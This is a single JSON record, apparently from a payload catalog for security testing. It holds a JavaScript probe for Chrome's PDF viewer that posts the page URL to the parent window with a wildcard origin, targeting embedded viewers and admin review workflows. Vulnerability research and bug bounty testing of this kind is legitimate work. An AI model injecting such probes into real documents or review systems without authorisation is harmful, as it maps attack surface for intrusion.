    {
      "id": "chrome_boundary_parent_postmessage",
      "category": "dom_access",
      "browser": "chrome",
      "technique": "parent_postmessage_probe",
      "payload": "(function(){try{if(window.parent&&window.parent!==window&&window.parent.postMessage){window.parent.postMessage({source:'pdfium',probe:'chrome-parent-postmessage',href:String(location.href)},'*');}}catch(e){}})();",
      "description": "High-signal message-boundary probe for embedded viewers and downstream admin review workflows.",
      "risk_level": "medium",
      "research_tier": "validation",
      "stability": "high",
      "expected_signal": "postmessage_activity",
      "bug_bounty_value": "high",
      "method_family": "bridge_probe",
      "boundary_target": "viewer_to_parent",
      "blind_channels": [
        "postmessage"
      ],
      "validation_stage": "boundary_validation",
      "signal_strength": "high",
      "delivery_paths": [
        "inline_preview",
        "admin_review",
        "embedded_viewer"
      ],
      "preconditions": [
        "Host page captures or reacts to postMessage traffic from the viewer"
      ],
      "evidence_level": "medium"
    },
